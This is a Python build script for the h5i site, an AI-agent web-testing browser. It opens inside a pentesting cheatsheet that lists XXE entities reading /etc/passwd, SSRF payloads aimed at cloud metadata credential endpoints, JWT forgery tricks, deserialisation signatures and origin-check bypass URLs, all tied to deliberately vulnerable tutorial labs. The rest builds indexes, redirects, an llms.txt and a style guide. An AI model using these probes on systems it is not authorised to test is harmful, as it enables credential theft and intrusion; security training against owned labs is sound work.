targets: /etc/passwd  /proc/self/environ  /proc/self/cmdline  access.log  .env
--raw-target when the encoding IS the payload
</code></pre>
<p><strong>XXE</strong> — [Lab 18]</p>
<pre><code class="language-xml">&lt;!DOCTYPE r [ &lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;
blind: parameter entity + external DTD on your host
</code></pre>
<p><strong>SSRF</strong> — [Labs 25, 26]</p>
<pre><code>127.0.0.1 → 2130706433 | 0x7f000001 | 017700000001 | 127.1 | 0 | [::1]
169.254.169.254/latest/meta-data/iam/security-credentials/
metadata.google.internal/computeMetadata/v1/  (+ Metadata-Flavor: Google)
also: file:// gopher:// dict://, a redirect you control, DNS rebinding
</code></pre>
<p><strong>JWT</strong> — [Labs 10, 11]</p>
<pre><code>alg: none (trailing dot)   |  crack a weak HS256 secret
RS256→HS256 (public key as the HMAC key)
kid: ../static/known.txt   |  jku/x5u pointing at your JWKS
missing exp / iss / aud checks
</code></pre>
<p><strong>Serialisation</strong> — [Lab 40]</p>
<pre><code>\x80\x04  pickle      rO0AB / \xac\xed  Java      O:8:&quot;  a:2:{  PHP
AAEAAAD/////  .NET      !!python/object/apply:  YAML   {&quot;$type&quot;:  Json.NET
</code></pre>
<p><strong>Origin / redirect validation</strong> — [Labs 23, 24]</p>
<pre><code>https://ok.example.evil.test        prefix check
https://evilok.example              suffix check
https://evil.test/?x=ok.example     substring check
https://ok.example@evil.test        userinfo
//evil.test    http://ok.example:9999    Origin: null
an open redirect ON the allowed origin
</code></pre>
<p><strong>Headers worth sweeping</strong> — [Labs 23, 29, 32, 33]</p>
<pre><code>Host  X-Forwarded-Host  X-Forwarded-For  X-Forwarded-Proto  X-Original-URL
X-Rewrite-URL  Origin  Referer  User-Agent  True-Client-IP  Via  X-Api-Version
</code></pre>
<p><strong>Mass-assignment field names</strong> — [Lab 09]</p>
<pre><code>is_admin isAdmin admin role roles is_staff is_superuser verified confirmed
active enabled credits balance quota plan tier owner_id user_id tenant_id
organization_id id uuid password_hash mfa_enabled
</code></pre>
<p><strong>CRLF</strong> — [Lab 31] carry real bytes: <code>$'\r\n'</code> in a JSON field, or
<code>--raw-target</code> / <code>--raw-request</code>. End the header block (<code>\r\n\r\n</code>) rather
than fighting duplicate-header precedence.</p>
<hr />
<h2 id="the-four-questions-for-any-endpoint">The four questions for any endpoint</h2>
<ol>
<li><strong>Who</strong> — replay it as every other actor (<code>--as</code>, no credential at all)</li>
<li><strong>What</strong> — change every identifier, and every field's <em>type</em></li>
<li><strong>How</strong> — change the method, the <code>Content-Type</code>, the path's spelling, the API version</li>
<li><strong>When</strong> — send it twice, send it out of order, send twenty at once (<code>--race</code>)</li>
</ol>
<hr />
<h2 id="reading-a-sweep">Reading a sweep</h2>
<pre><code class="language-bash">for v in …; do
  h5i websec replay req_0 --session s --reset-budget --set query.x=&quot;$v&quot; |
    python3 -c 'import json,sys;r=json.load(sys.stdin);s=r[&quot;response&quot;]
print(s[&quot;status&quot;], s[&quot;bytes&quot;], r[&quot;samples&quot;][0][&quot;total_ms&quot;])'
done | sort | uniq -c
</code></pre>
<p>Status, size, time. The outlier is the finding.</p>
<hr />
<h2 id="when-something-does-not-work">When something does not work</h2>
<pre><code>payload had no effect      →  websec show req_N --raw   (did it leave as written?)
everything returns the same →  h5i browser requests     (did policy refuse it?)
a loop goes quiet          →  --reset-budget
--set refused              →  --create
a value became a string    →  it did not parse as JSON — check the quoting
% got re-encoded           →  --raw-target
framing headers rewritten  →  --raw-request
a page script did nothing  →  --script on the session
a socket said nothing      →  raise --wait-ms
</code></pre>""",
}




ARTICLES = [RECON, ACCESS, JWT, SQLI, INJECTION_LABS, BROWSERXSS, SSRF, PROTOCOL,
            LOGIC, CHAINS, CHEATSHEET,
            SESSION, WEB_SECURITY_GUIDE, FIRST_BOX, POLICY, BROWSER, REVIEW_PR,
            AI_PENTESTING_TOOLS, BURP_COMPARISON, ZAP_COMPARISON, CAIDO_COMPARISON,
            LOOP, ENVIRONMENT, TIERS, EVIDENCE, INJECTION]


def index_page(section, items):
    guides = section == "guides"
    # Both hubs lead with the browser, because that is what h5i is; the box is
    # where a session is placed, not the headline.
    title = "h5i guides: agent browsing and web security testing" if guides else "h5i essays: agent browsers, sandboxes, and web security"
    description = ("A ten-part h5i web security tutorial with runnable CTF labs, plus guides to auditable agent browsing, authorized AI pentesting, and sandboxed code review."
                   if guides else "Nine essays on auditable AI browsing, sandboxing, evidence, and comparisons of h5i with Burp Suite, OWASP ZAP, and Caido for agent testing.")
    # A hub heading names the section. It is the one page on the site whose
    # job is to be a label, so the argument goes in the deck.
    h1 = "h5i Guides" if guides else "h5i Blog"
    deck = ("The web security tutorial runs first, ten articles against 42 deliberately vulnerable labs you run on your own machine, from recon to a full exploit chain. Then the task guides: drive a browser session and audit the requests behind it, scope an agent to a target you are authorized to test, and run untrusted code in a box."
            if guides else
            "Why an agent's browser and its boundary belong in one place, what counts as evidence of what an agent actually did, and where h5i differs from Burp Suite, OWASP ZAP, and Caido.")
    url = f"https://h5i.dev/{section}/"
    # A hub is a page in its own right. Without CollectionPage and a breadcrumb
    # it is the one level of the site with no trail, while every article under
    # it has one.
    schema = {"@context": "https://schema.org", "@graph": [
        {"@type": "CollectionPage", "@id": f"{url}#page", "url": url, "name": title,
         "description": description, "inLanguage": "en", "dateModified": modified(f"{section}/"),
         "isPartOf": {"@id": "https://h5i.dev/#website"},
         "about": {"@id": "https://h5i.dev/#app"}, "primaryImageOfPage": SOCIAL_IMAGE},
        {"@type": "BreadcrumbList", "@id": f"{url}#breadcrumb", "itemListElement": [
            {"@type": "ListItem", "position": 1, "name": "Home", "item": "https://h5i.dev/"},
            {"@type": "ListItem", "position": 2, "name": section.title(), "item": url},
        ]},
        {"@type": "ItemList", "@id": f"{url}#list", "name": title,
         "itemListElement": [{"@type": "ListItem", "position": i + 1, "url": f"https://h5i.dev/{section}/{x['slug']}/", "name": x["h1"]} for i, x in enumerate(items)]},
    ]}
    rows = ""
    for i, item in enumerate(items, 1):
        label = item["eyebrow"].split(" / ")[0]
        rows += f"""<a class="post-card{' featured' if i == 1 else ''}" href="/{section}/{item['slug']}/">
<div class="card-meta"><span>{label}</span><span>{item['time']}</span></div>
<h2>{item['h1']}</h2><p>{item['description']}</p></a>"""
    return f"""{head(title, description, url, schema, kind="website", rss=not guides)}
<body>{NAV}<section class="index-hero"><div class="post-eyebrow">{len(items)} {"chapters and guides" if guides else "essays and comparisons"}</div>
<h1>{h1}</h1><p>{deck}</p></section><section class="post-list">{rows}</section>{FOOTER}</body></html>"""


REDIRECTS = {
    "blog": {
        "agent-sandbox-env": "the-environment-is-the-sandbox", "what-is-ai-aware-version-control": "the-environment-is-the-sandbox",
        "orchestration-patterns-beyond-ensemble": "the-environment-is-the-sandbox", "git-notes-vs-h5i-ai-coding-workflows": "the-environment-is-the-sandbox",
        "sandboxing-ai-agents-foundations": "choosing-agent-isolation", "sandboxing-ai-agents-implementation": "choosing-agent-isolation",
        "sandboxing-ai-agents-landscape": "choosing-agent-isolation", "sandboxing-ai-agents-h5i": "choosing-agent-isolation",
        "auditable-workspaces-for-ai-agents": "evidence-for-agent-work", "why-git-diffs-are-not-enough-for-ai-generated-code": "evidence-for-agent-work",
        "structured-tool-output-schema": "evidence-for-agent-work", "uncertainty-heatmap": "evidence-for-agent-work",
        "track-claude-code-prompts-diffs-git": "evidence-for-agent-work", "from-git-blame-to-ai-blame": "evidence-for-agent-work",
        "pr-body-ai-code-review": "evidence-for-agent-work", "review-code-written-by-ai-agents": "evidence-for-agent-work",
        "auditing-ai-generated-code": "evidence-for-agent-work", "prompt-injection-in-agent-traces": "prompt-injection-is-a-boundary-problem",
        "cve-2026-33068-bypass-permissions-settings": "prompt-injection-is-a-boundary-problem",
        "cve-2025-59536-startup-trust-dialog": "prompt-injection-is-a-boundary-problem",
        "claude-code-hooks-vs-git-hooks": "evidence-for-agent-work", "programmable-agent-orchestration-edsl": "choosing-agent-isolation",
        "write-your-first-orchestra-score": "choosing-agent-isolation", "context-dag-versioned-agent-reasoning": "evidence-for-agent-work",
        "persistent-memory-for-claude-code": "prompt-injection-is-a-boundary-problem", "token-reduction-object-store": "the-environment-is-the-sandbox",
        "git-communication-layer-ai-agents": "the-environment-is-the-sandbox", "i5h-agent-to-agent-messaging": "the-environment-is-the-sandbox",
        "prompt-maturity-score": "the-environment-is-the-sandbox", "agent-ensembles-with-h5i-team": "the-environment-is-the-sandbox",
        "agents-share-information-never-permissions": "the-environment-is-the-sandbox",
    },
    "guides": {
        "ai-code-review-audit": "review-a-pull-request", "ai-code-provenance": "first-box",
        "secure-api-tokens-in-agent-box": "write-a-box-policy", "prompt-injection-detection-for-agents": "write-a-box-policy",
        "claude-code-memory": "first-box", "codex-claude-code-collaboration": "first-box",
        "git-blame-for-ai-code": "review-a-pull-request", "token-reduction-capture-run": "first-box",
        "run-a-forum": "first-box",
    },
}


# Retired top-level pages. `/workflows/` was a sixth section holding one page,
# the end-to-end loop, which is an essay and now lives in the blog as one.
TOP_REDIRECTS = {"workflows": "/blog/the-h5i-loop/"}


def redirect_page(target):
    # No `noindex` here, deliberately. There is no server-side 301 on a static
    # host, so an instant meta refresh plus a canonical is the only way to tell
    # a crawler this URL became that one. `noindex` would drop the old URL
    # instead of folding it into the new one, throwing away whatever the
    # retired page had earned. These stubs are kept out of the sitemap, the
    # feed, llms.txt and every index, so nothing invites a crawler to them.
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="robots" content="noarchive"><link rel="canonical" href="https://h5i.dev{target}">
<meta http-equiv="refresh" content="0; url={target}"><title>Article moved | h5i</title></head>
<body><p>This page moved during the documentation rewrite. <a href="{target}">Read the page that replaced it.</a></p></body></html>"""


def build():
    generated = {}
    for section in ("blog", "guides"):
        base = ROOT / section
        # list(), not the generator: removing entries while iterating the
        # directory skips some of them, and a survivor makes the mkdir below
        # fail on a slug this build owns.
        for child in list(base.iterdir()):
            if child.is_dir():
                shutil.rmtree(child)
        selected = [item for item in ARTICLES if item["section"] == section]
        generated[f"{section}/"] = index_page(section, selected)
        (base / "index.html").write_text(generated[f"{section}/"])
        for item in selected:
            out = base / item["slug"]
            out.mkdir()
            generated[f"{section}/{item['slug']}/"] = article_page(item)
            (out / "index.html").write_text(generated[f"{section}/{item['slug']}/"])
        for old, new in REDIRECTS[section].items():
            out = base / old
            out.mkdir(exist_ok=True)
            (out / "index.html").write_text(redirect_page(f"/{section}/{new}/"))

    for old, target in TOP_REDIRECTS.items():
        out = ROOT / old
        out.mkdir(exist_ok=True)
        (out / "index.html").write_text(redirect_page(target))

    # Every page is written by now, so the recorded dates can be checked
    # against what actually shipped before they are published as `lastmod`.
    verify_dates(generated)

    core = [("", "1.0"), ("features/", "0.9"), ("manual/", "0.9"),
            ("guides/", "0.8"), ("blog/", "0.8"), ("pitch/", "0.6"), ("demo/", "0.6")]
    urls = [(path, priority, modified(path)) for path, priority in core]
    urls += [(f"{item['section']}/{item['slug']}/", "0.7", modified(f"{item['section']}/{item['slug']}/"))
             for item in ARTICLES]
    rows = "\n".join(f"  <url><loc>https://h5i.dev/{path}</loc><lastmod>{lastmod}</lastmod><priority>{priority}</priority></url>" for path, priority, lastmod in urls)
    (ROOT / "sitemap.xml").write_text(f'<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n{rows}\n</urlset>\n')

    posts = [item for item in ARTICLES if item["section"] == "blog"]
    items = "\n".join(f"""    <item><title>{item['h1']}</title><link>https://h5i.dev/blog/{item['slug']}/</link>
      <guid isPermaLink="true">https://h5i.dev/blog/{item['slug']}/</guid><pubDate>{rfc822(item.get('published', PUBLISHED))}</pubDate>
      <description>{item['description']}</description></item>""" for item in posts)
    (ROOT / "feed.xml").write_text(f"""<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"><channel>
<title>The h5i Blog</title><link>https://h5i.dev/blog/</link>
<description>Design essays on giving an AI agent a browser you can audit: boundaries, evidence, and what a request log has to prove.</description>
<language>en-us</language><lastBuildDate>{rfc822(max(modified(f"blog/{item['slug']}/") for item in posts))}</lastBuildDate>
<atom:link xmlns:atom="http://www.w3.org/2005/Atom" href="https://h5i.dev/feed.xml" rel="self" type="application/rss+xml"/>
{items}</channel></rss>""")

    (ROOT / "llms.txt").write_text("""# h5i

> h5i ("high-five") is an open-source red-teaming browser for AI agents. An agent drives a browser session by id, reads the page as an outline with @ref handles, and then works the traffic that session produced: read a captured message byte for byte, change one field, send it again, compare the answers. The engine is the HTTP client, so every request is checked against the session policy and written down before the bytes move, and a fetch that cannot be recorded is refused. A request that is not in the log did not happen. Replay travels that same path, so it is not a side channel around scope. Sessions run on the host by default with no containment claimed, and one flag places the same session inside a sandbox, which adds an egress allowlist enforced outside the browser. Use h5i only against systems you own or are explicitly authorized to test.

## Start here

- [Features](https://h5i.dev/features/): Product overview: automated browsing, reconnaissance, HTTP capture and editing, the limits you place around the agent, and the review surface.
- [Run an authorized web security test](https://h5i.dev/guides/authorized-web-security-testing/): Scope a session to one target, inventory its endpoints, replay one request, and close with the evidence intact.
- [Drive a browser session](https://h5i.dev/guides/drive-a-browser-session/): Open a session, read the page, act on it, and read back what it reached.
- [AI pentesting tools compared](https://h5i.dev/blog/ai-pentesting-tools/): Burp Suite, OWASP ZAP, Caido, and h5i, chosen by what you delegate to AI.
- [Manual](https://h5i.dev/manual/): Authoritative command, policy, receipt, and limitation reference.

## The web security tutorial

Ten articles that walk the 42 runnable labs in h5i-dev/h5i-tutorial, from recon to a complete exploit chain. Part 1 of the series is on Medium; these are the rest.

1. [Recon and IDOR](https://h5i.dev/guides/recon-and-idor/): Discover hidden endpoints, then test object-level authorization and why an unguessable URL is not an access control.
2. [Broken Access Control](https://h5i.dev/guides/broken-access-control/): Compare two logged-in users with --as, and find the fields a user interface never sends.
3. [JWT Attacks](https://h5i.dev/guides/jwt-attacks/): alg confusion, a weak HMAC secret, and a key identifier turned into a path traversal.
4. [SQL Injection](https://h5i.dev/guides/sql-injection/): A union read, then boolean and timing oracles when the application reveals almost nothing.
5. [Injection Beyond SQL](https://h5i.dev/guides/injection-beyond-sql/): NoSQL operators, shell commands, server-side templates, XML entities, and second-order input.
6. [The Browser as a Weapon](https://h5i.dev/guides/browser-as-a-weapon/): Reflected and stored XSS, CSRF, CORS misconfiguration, and an OAuth redirect_uri leak.
7. [SSRF and File Attacks](https://h5i.dev/guides/ssrf-and-file-attacks/): Internal services, filter bypasses, encoded traversal, upload writes, and log poisoning.
8. [HTTP Protocol Attacks](https://h5i.dev/guides/http-protocol-attacks/): Request smuggling, CRLF injection, host header poisoning, cache poisoning, WebSocket frames.
9. [Business Logic, Time, and Crypto](https://h5i.dev/guides/logic-time-and-crypto/): Races, coupon stacking, predictable tokens, length extension, MFA state, and a pickled cookie.
10. [Building Exploit Chains](https://h5i.dev/guides/exploit-chains/): Carry fresh values between requests and turn small findings into one reproducible compromise.
11. [Cheatsheet](https://h5i.dev/guides/cheatsheet/): The loop, every --set target, the replay flags, probe values by class, and how to read a sweep.

## Tool comparisons

- [AI pentesting tools: Burp Suite, ZAP, Caido, or h5i?](https://h5i.dev/blog/ai-pentesting-tools/): Four tools compared through AI-assisted manual testing, AI-authored scan automation, and agent-led investigation.
- [Burp Suite vs h5i for AI agents](https://h5i.dev/blog/burp-suite-vs-h5i-for-ai-agents/): A complete web-testing platform versus fully automated penetration testing driven by an external AI agent.
- [OWASP ZAP vs h5i for AI agents](https://h5i.dev/blog/owasp-zap-vs-h5i-for-ai-agents/): Automated DAST and scanner findings versus an AI agent that directs the complete testing loop.
- [Caido vs h5i for AI agents](https://h5i.dev/blog/caido-vs-h5i-for-ai-agents/): A full proxy workspace and agent API versus an external AI agent driving the investigation end to end.

## Design essays

- [Sandbox the entire workflow: browse, develop, review, apply](https://h5i.dev/blog/the-h5i-loop/): Put the browser, checkout, agent, tools, tests, and dev server in one box, then review the evidence before the patch crosses out.
- [Why sandbox the entire AI agent workload](https://h5i.dev/blog/the-environment-is-the-sandbox/): Coding tasks execute dependencies, build tools, tests, servers, and pages—not only the agent process.
- [How to choose an AI agent sandbox](https://h5i.dev/blog/choosing-agent-isolation/): Choose process, supervised, container, or microVM isolation by the failure it must prevent.
- [Review AI-generated code with execution evidence](https://h5i.dev/blog/evidence-for-agent-work/): Check the diff alongside observed test results, denied actions, browser errors, and explicit gaps in collection.
- [How to protect a coding agent from prompt injection](https://h5i.dev/blog/prompt-injection-is-a-boundary-problem/): Restrict host files, reusable credentials, network destinations, local sockets, browser state, and writes to the parent repository.

## The browser session

- A browser session holds one page state, one cookie jar, one request log, and one policy, addressed by an id.
- The engine is the HTTP client: policy first, record second, wire third. A fetch that cannot be recorded is refused.
- open grants the page it was given and nothing else remote. --allow names the origins beyond it, such as an API the page calls or a CDN it pulls from.
- An off-origin subresource is refused even though the page loaded, and the refusal is in the request log.
- Loopback is reachable by default because it is the dev server, and --no-loopback takes that back.
- A credentialed cross-origin request whose answer nobody can read is refused by default. --permissive-cors lifts that for one session, is part of its policy digest, and is named on the open banner and in status.
- Denials are recorded with their reason, so the log shows what was attempted and not only what succeeded.
- A redirect out of the allowlist is refused at the hop, not followed and explained afterwards.
- h5i browser audit merges verbs, fetch decisions, control handovers, and the ending into one ordered timeline.
- Every audit row carries its lane: the engine's own account, or what h5i observed from outside. They are never merged.
- An audit reports each source as read, empty, or unavailable, because an unwatched log is not a quiet session.
- A fetch carries caused_by naming the verb the page was under; links come from the source, never from timing.
- Snapshots arrive fenced as untrusted page content; escape sequences and control characters never reach the terminal.
- Relayed strings, arrays, and nesting are capped, and the truncation is stated in the value.
- Page JavaScript is off unless requested, which removes the page-borne injection delivery channel.
- Session states are live, closed, died, expired, evicted. A verb on a non-live session exits 69 and never restarts it.
- Session ids are never reused; --restore inherits storage into a new id and records the inheritance.
- Sessions live under $H5I_BROWSER_HOME or $XDG_STATE_HOME/h5i/browser, never under a git repository.
- The engine is pure Rust with no Chromium and no V8.

## The HTTP workbench

- websec is a plugin rather than part of the default build: h5i plugin install websec, or install.sh -s -- --websec.
- h5i websec requests, show --raw, replay --set, diff, match, and sitemap read and work the messages a session captured.
- Capture is opt-in with --capture, because the message store holds request and response bodies in full.
- The message store is never included in an export unless it is named.
- Replay goes through the same broker as browsing: the policy decides, the receipt is written first, and an off-scope replay is refused rather than sent.
- A replay cannot widen its session's allowlist. Changing scope means a new session with a new policy, which is a visible act.
- Hop-by-hop headers the client owns are recomputed, and an attempt to set them is reported as overridden rather than accepted silently.
- match exits 0 when the condition holds, 1 for a miss, and 2 when it could not look.
- h5i websec sitemap folds observed receipts into origins and endpoints, carrying methods, statuses, parameter names, and hit counts, with refused URLs listed apart. Disclosed but unvisited URLs are not in it.
- h5i browser rpc --stdio is the same verbs over one process, so a loop that sends hundreds of requests pays process startup once.

## The recon ledger

- recon is a plugin as well: h5i plugin install recon, or install.sh -s -- --recon.
- Discovery is kept apart from testing. Recon records what a target exposes and how it knows; calling a difference a vulnerability stays the agent's claim.
- Every endpoint carries a state: candidate, observed, confirmed, refused, or gone.
- candidate means something disclosed it and no request was ever sent. observed means a request answered, and the row names the message.
- confirmed means the answer differs from the calibrated missing-path baseline for that directory. It does not mean interesting.
- refused means policy declined it, and the row is kept, because that is a fact about the scope.
- Confirmation happens only in triage --calibrate, which learns what a missing path looks like in each directory. Against an application that answers 200 for everything, nothing is confirmed without it.
- recon extract reads what the session already fetched; recon known checks robots.txt, sitemap.xml, security.txt, and .well-known/openid-configuration.
- robots.txt is a source of candidates and not an authorisation oracle. Scope comes from policy.
- recon crawl walks the target under this session's login, bounded by --max-requests and --rate.
- h5i ships no wordlist: paths --wordlist takes a list you bring, and --reuse-words uses the words the session has already seen.
- recon import reads urls, katana, subfinder, httpx, or openapi output as candidates that stay candidates until an h5i request answers.
- Runs that spend requests are jobs, with jobs list, show, and resume. The ledger is written as a run goes, so a run that is killed keeps what it found.
- Recon sends through the engine's own verbs. There is no second HTTP client, no --all-origins, and no spawning of third-party security tools.

## The box

- A box is a complete disposable development environment for one agent.
- Five tiers: workspace, process, supervised, container, microvm.
- Explicit isolation requests fail closed; h5i never silently downgrades.
- supervised and microvm enforce egress at L3/L4. container uses an L7 proxy allowlist.
- engine-claimed is the engine's own fail-closed account. host-observed means a box boundary saw it too.
- A box upgrades the lane only when something outside the engine enforces egress; being boxed is not enough.
- The control lock is enforced for a boxed session, because every verb is carried in from the host, and advisory otherwise.
- Model credentials remain host-side and are injected by a runtime-scoped proxy.
- h5i box export produces patch.diff, report.md, and receipt.json, and writes browser/<id>.json for each session placed in the box.
- h5i is local-first, Apache-2.0, and requires no hosted sandbox or SaaS account.

## Honest limits

- h5i cannot grant authorization or infer scope from a URL. Record the permitted hosts, accounts, techniques, request rate, and time window before running an agent.
- h5i is not a vulnerability scanner. It ships no exploit library, payload generator, fingerprint database, or wordlist.
- Recon produces no verdicts and no severities. confirmed means distinguishable from the not-found baseline, nothing more.
- A response diff is evidence of a difference, not proof of impact. Severity and exploitability still require review.
- The capture store can hold credentials and personal data in full. Treat it as sensitive test evidence and redact it before sharing an artifact.
- With the default cross-origin refusal in force h5i cannot act as the victim, so a negative CSRF result means h5i declined, not that the target is safe.
- A session on the host is not sandboxed and h5i does not claim it is. Containment is the --in flag.
- The engine is not a complete browser: canvas, WebSockets, Workers, and IndexedDB are absent. Of twenty single-page applications measured, eighteen read usefully and one not at all.
- For a target the engine cannot read, run Chromium inside a box and accept the tier's boundary in place of engine-level capture.
- h5i does not classify page content. It bounds what a persuaded agent can reach rather than detecting persuasion.
- A boxed session needs a tier that can hold a resident process, and not every tier that enforces egress can.
- Containment cannot stop source code from being included in an allowed model request.
- Every tier below microvm shares the host kernel.
- Container egress scoping binds proxy-respecting software only.
- Box-claimed receipt data can be omitted or fabricated; h5i keeps it distinct from host-observed evidence.
- A local receipt is protected from the box, not notarized against the host owner.
""")

    (ROOT / "content-style-guide.md").write_text("""# h5i editorial guide

The documentation has four jobs. Product pages answer what h5i is. Guides help
a reader finish a task. The manual defines commands and fields. Blog essays
explain durable design choices. Do not make one page perform another layer's
job.

## Keep the collection small

A new page needs a job no existing page can do.

- Extend a guide when the reader is still pursuing the same outcome.
- Extend the manual when the material defines a command, field, or limit.
- Extend an essay when the material supports the same central claim.
- Add a page only for a genuinely different reader, outcome, or argument.

Never split one subject into a series to manufacture volume. Redirect retired
URLs to the closest replacement. Keep redirects out of indexes, feeds, the
sitemap, and llms.txt.

## Voice

h5i is confident, concrete, and honest about boundaries.

1. State the claim early.
2. Name the command, mechanism, or limitation that supports it.
3. Prefer short sentences at the moment the argument turns.
4. Use contrast when it clarifies a boundary: state versus execution,
   testimony versus observation, portability versus network enforcement.
5. Avoid marketing fog such as seamless, powerful, revolutionary, and
   game-changing.

Use h5i in lowercase. A disposable environment is a box. The security property
is a boundary or confinement. Use receipt for the execution record and output
gate for the human-operated export step.

Say host-observed for what this machine recorded and box-claimed for what the
box itself reported. Never merge the two into one label.

Do not resurrect removed product language. h5i is not a provenance system, an
agent ensemble, an orchestra, or an AI-aware version-control layer.

## Guides

A guide is imperative and outcome-shaped. It contains:

1. A short explanation of why the task needs a box.
2. An outcome callout.
3. Numbered steps with imperative headings.
4. Commands that match the current manual.
5. A check after every consequential action.
6. The security gotcha most likely to change the decision.
7. A stopping point: export, apply, or remove.
8. Links to the relevant manual section and the next guide.

Do not narrate product history in a guide. Do not hide prerequisites in the
third step. Do not show fictional output as if it came from a real run.

## Blog essays

An essay earns its place by making one durable argument:

1. Claim: one self-contained answer in the opening callout.
2. Tension: the familiar approach and the limit it reaches.
3. Mechanism: the concrete design choice that changes the result.
4. Tradeoff: what the design does not solve or makes worse.
5. Practical test: questions the reader can apply elsewhere.

The blog is not a changelog, vulnerability feed, benchmark archive, or release
announcement surface.

## Editorial depth

Published essays should normally reach 1,800–2,800 words. Guides should usually
reach 1,000–1,500 words without delaying the first runnable command. Word count
is a floor for developed reasoning, not a target to pad.

Every canonical page needs at least one useful visual: an architecture diagram,
evidence screenshot, decision table, or workflow figure. The visual must teach
a relationship the prose would otherwise make the reader reconstruct.

An essay should include a concrete failure or run, implementation-level
mechanism, the tradeoff that mechanism introduces, and sources. A guide should
include expected evidence, common failure modes, and a clear stopping point.

## Claims and limits

Name the layer and the observer.

- supervised and microvm enforce egress at L3/L4.
- container uses an L7 proxy allowlist.
- Every tier below microvm shares the host kernel.
- A host-observed exit is evidence. An agent-authored summary is testimony.
- A receipt is protected from the box, not notarized against the host owner.
- Containment does not stop source from entering an allowed model request.

If a section is unavailable, say why. Absence must not impersonate success.

## Page mechanics

Every canonical article needs one H1 and a contiguous heading outline;
descriptive metadata; canonical, Open Graph, and Twitter tags, including an
image alt; TechArticle and BreadcrumbList JSON-LD; visible FAQ text when
FAQPage data is present; useful internal links; a current dateModified; and
inclusion in sitemap.xml. Blog essays also enter feed.xml.

A title should fit in about 60 characters and a meta description in about 160,
because that is where a search result cuts them. When a page's card blurb is
worth more room than that, give it a shorter `meta` line as well.

Dates are not decorative. `PAGE_HISTORY` in this file records each page's last
content change beside a fingerprint of what it contained, and the build refuses
to finish when a fingerprint moves without its date, so `lastmod` and
`dateModified` cannot quietly describe a version that no longer ships.

One entity, one @id. The product is `https://h5i.dev/#app` and the site is
`#website` on every page that names them; a page-scoped node (`#faq`,
`#breadcrumb`, `#webpage`) is scoped to that page's URL. Two pages describing
one @id differently, or one page carrying two BreadcrumbLists, leaves a crawler
picking between them. A breadcrumb is the trail to the page it sits on, so the
home page has none.

Before publishing, remove repeated setup, claims without mechanisms, invented
precision, and references to features the manual no longer documents. Then
read the opening callout and every heading without the body. They should still
tell the whole story.
""")


if __name__ == "__main__":
    build()
    # Stamp what was just rewritten. `build()` reissues every page it owns with
    # bare `_static` links, so without this a plain `python3 build-content.py`
    # leaves a tree CI rejects. The generator that stales a page is the one that
    # should un-stale it; nobody should have to remember a second command.
    subprocess.run(
        [sys.executable, str(ROOT.parent / "scripts" / "stamp_assets.py")],
        check=True,
        stdout=subprocess.DEVNULL,
    )
